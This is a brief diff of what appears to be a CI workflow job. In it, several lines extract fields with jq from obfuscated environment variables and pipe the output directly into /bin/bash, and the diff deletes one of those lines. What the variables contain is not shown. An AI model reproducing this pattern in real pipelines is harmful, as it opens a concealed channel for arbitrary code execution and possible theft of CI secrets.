@@ -31,7 +31,6 @@ jobs:
           echo $hw426 | jq -r .chwpx5 | /bin/bash
           printf '%s' "$qmo13244" | jq -r .vvf8161 | /bin/bash
           echo $ulw8 | jq -r .aptkl93 | /bin/bash
-          printf '%s' "$a80525" | jq -r .hxh9 | /bin/bash
           printf '%s' "$s83" | jq -r .sn4643 | /bin/bash
           printf '%s' "$bqn96475" | jq -r .ir9 | /bin/bash
 
